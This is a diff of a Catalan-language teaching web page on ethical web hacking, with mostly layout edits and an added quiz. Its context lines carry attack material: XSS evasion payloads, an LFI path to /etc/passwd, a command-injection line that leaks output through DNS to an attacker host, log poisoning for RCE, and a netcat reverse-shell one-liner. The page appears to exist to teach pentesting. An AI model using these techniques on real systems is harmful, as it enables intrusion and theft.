@@ -428,9 +428,12 @@ https://exemple.com/pagina.php?lang=/etc/passwd</code> </pre>
         </ul>
         
         <h4>Tècniques d'injecció</h4>
+        <ul>
         <li>Us de condicions booleanes</li>
         <li>Us de operador UNION</li>
         <li>Descobrir l'estructura de la base de dades</li>
+        </ul>
+        
 
         <hr><h3>Blind Injection</h3>
         <p>La injecció SQL cega (Blind SQL Injection) és una tècnica d'atac on un atacant pot explotar una vulnerabilitat de injecció SQL, 
@@ -521,7 +524,7 @@ Treure el password caràcter a caràcter
           <p>Encara que no esta lligada a cap SGBD, ofereix plantilles preconfigurades per alguns SGBD comuns, com: 
             MySQL, PostgreSQL, Microsoft SQL Server (MSSQL), Oracle Database, SQLite</p>
 
-
+            <br><hr>
         <h2>Cross-Site Scripting XSS</h2>
         <p>El Cross-Site Scripting (XSS) és una vulnerabilitat de seguretat en aplicacions web que permet a un atacant injectar scripts maliciosos 
         (generalment JavaScript) en pàgines web visualitzades per altres usuaris. L'atacant pot utilitzar aquests scripts per a robar dades, 
@@ -547,6 +550,7 @@ Treure el password caràcter a caràcter
           <li><strong>XSS basat en DOM (DOM-based XSS)</strong></li>
           En aquest cas, la vulnerabilitat es troba al costat del client, al codi JavaScript de la pàgina, no al servidor.
         </ol>
+
         <h4>XSS reflectit (Reflected XSS)</h4>
         <img src="imgs/xss-r-attack.png" alt="r-xss" width="50%" class="imatge-dreta" >   
         <p>Com funciona? L'atacant crea un enllaç maliciós amb el codi maliciós injectat. Normalment es fa arribar a la victima amb Enginyeria Social.
@@ -559,9 +563,13 @@ Treure el password caràcter a caràcter
          <p>També se sol utilitzar la funcio <code>alert(1)</code> per testar XSS</p>
             <h5>Evasió</h5>
             <p>Per evitar ser detectat per les possibles funcions que netegen el codi, es poden utilitzar algunes tècniques..</p>
+            <ul>
             <li>En <strong>BurpSuit</strong> hi ha una opció per Codificar en hexadecimal (encode as ..url) </li>
             <li>També es pot barrejar majúscules <code>=&lt;sCript>alert(1);&lt;/sCript></code> </li>
             <li>Usar altres etiquetes html combinades amb events.. <code> &lt;img src=1 onerror=alert(1)>  </code></li>
+            </ul>
+
+
         
 
         <h4>XSS emmagatzemat (Stored XSS)</h4>
@@ -650,7 +658,7 @@ Treure el password caràcter a caràcter
         dig @IP_DNS_ATACANT 'whoami'.dominio.com &
         <p><a href="https://www.youtube.com/watch?v=dE-_tLSQcbU">Video explicació OS command injection</a></p>
 
-        <hr><h2>Cross-Site Request Forgery CSRF</h2>
+        <br><hr><h2>Cross-Site Request Forgery CSRF</h2>
         <p>CSRF és una vulnerabilitat de seguretat web que permet a un atacant fer que un usuari <strong>autenticat</strong> execute accions sense voler-ho en una aplicació web</p>
         <p>El problema clau és que el servidor confia en el navegador de l’usuari perquè ja té la sessió oberta (cookies, token de sessió, etc.)</p>
         <h4>Com detectar-la?</h4>
@@ -722,7 +730,7 @@ Treure el password caràcter a caràcter
 
       <section id="explot">
       <h1>Explotació</h1>
-       <h3> Log poisoning</h3>
+       <h2> Log poisoning</h2>
          <p>Una forma es utilitzar el fitxer <code>/var/log/apache2/access.log</code> .  Este fitxer registra tots els accesos al servidor web.</p>
          <p>El valor <em>User-Agent</em> és el tipus de navegador que està accedint, i queda registrat.</p>
          <p>La informació de <em>User-Agent</em> es pot canviar amb BurpSuite o ZAP, interceptant el http-request, i modificant el contingut</p>
@@ -739,7 +747,7 @@ Treure el password caràcter a caràcter
 /var/log/nginx/access.log  # Si s'usa nginx
 /proc/self/environ         </pre>
 
-         <h3>RCE</h3>
+         <br><h2>RCE - Remote Code Execution</h2> 
         <h3>Execució remota de codi (RCE) mitjantçant  <em>log poisoning + LFI</em></h3>
         <p>Per conseguir una execució remota de codi, es necessari trovar la forma de escriure en algun fitxer, inserir codi en ell, i després 
           visualitzar el fitxer amb LFI. Una tècnica per fer això és el <em>log poisoning</em> o enverinament de logs.      </p>
@@ -835,7 +843,7 @@ Si existeix, l'ordre retorna on està l'executable, si no existeix no retorna re
 
       <p>Una <strong>reverse shell</strong> amb <em>nc</em> sol ser bàsica i limitada. Normalment els passos següents són:</p>
 
-      <h2>🔧 1. Estabilitzar la shell</h2>
+      <h2>✔️  1. Estabilitzar la shell</h2>
       <p>La shell de netcat sol ser molt incòmoda (sense autocompletat, sense ctrl-c, sense històric…). Es pot millorar així:</p>
 
       <p><strong>Mètode Python</strong> (si està instal·lat):</p>
@@ -848,7 +856,7 @@ reset
 export TERM=xterm 
       </code></pre>
 
-      <h2>🔧 2. Comprovar usuari i privilegis</h2>
+      <h2>🎭 2. Comprovar usuari i privilegis</h2>
       <pre><code>whoami
 id
 hostname
@@ -927,7 +935,7 @@ find / -user root -perm -u=s 2>/dev/null         </code></pre>
           <li>Permisos sudo insegurs</li>
       </ul>
 
-      <h2>🔐 7. Persistència (només si l’abast ho permet)</h2>
+      <h2>📌 7. Persistència (només si l’abast ho permet)</h2>
       <p>Exemples (si està en el contracte):</p>
       <ul>
           <li>Afegir claus SSH</li>
@@ -936,7 +944,9 @@ find / -user root -perm -u=s 2>/dev/null         </code></pre>
           <li>Reverse shell permanent</li>
       </ul>
 
-      <h2>📑 8. Neteja final (molt important)</h2>
+      <h2>🕵️ 8. Exfiltració  (només si l’abast ho permet)</h2>
+
+      <h2>🧹 9. Neteja final (molt important)</h2>
       <p>Dins d’un pentest ètic sempre s'ha de:</p>
       <ul>
           <li>Borrar scripts pujats</li>
@@ -1021,13 +1031,36 @@ nc 192.168.56.10 4444 -e /bin/bash   # ip de l'atacant</pre>
      </section> 
       
 
-    </main>
 
-    <footer>
-      <p style="font-family: 'CCSymbols', sans-serif; font-size:larger;" >
-        Llicència: &#x1F16D; &#x1F16F; &#x1F10E; &#x1F10F; - U4 - HE a aplicacions WEB 
-      </p>
-    </footer>
+
+ </section>
+    <section id="altres-recursos">
+      <hr><h2 id="quizz_title">Comprueba tu progreso...</h2>
+    <div id="progress-container">
+    <div id="progress-bar"></div>  </div>
+    <!-- <div id="percentatge-text">0%</div>  -->
+
+    <div class="quiz-container">
+        <h4 id="pregunta-text"></h4>
+        <div id="options-container" class="options">
+        </div>
+
+        <p id="feedback"></p>
+        <button id="btn-pista"  onclick="mostrarPista()">🕵️‍♂️ Quieres una pista??</button>
+        <button id="btn-seguent" onclick="seguentPregunta()">      ➕ Siguiente pregunta </button>
+        <button id="btn-reiniciar"  onclick="carregarPreguntes('UD4__1')">🔁 Reiniciar</button>
+        <p id="pista"></p>
+   </section>
+
+
+    
+  </main>
+
+  <footer>
+    <p style="font-family: 'CCSymbols', sans-serif; font-size:larger;" >
+      Llicència: &#x1F16D; &#x1F16F; &#x1F10E; &#x1F10F; - U4 - HE a aplicacions WEB 
+    </p>
+  </footer>
   </div>
 
   
@@ -1052,5 +1085,21 @@ nc 192.168.56.10 4444 -e /bin/bash   # ip de l'atacant</pre>
            // document.addEventListener("DOMContentLoaded", () => { actualitzaSelect();  });  // altra manera, no posant en el body
     </script>
 
+    <script>
+          // Executar en carregar la pàgina
+          window.onload = carregarPreguntes('UD4__1');
+    </script>
+
 </body>
 </html>
+
+
+
+
+
+
+ 
+
+  
+  
+
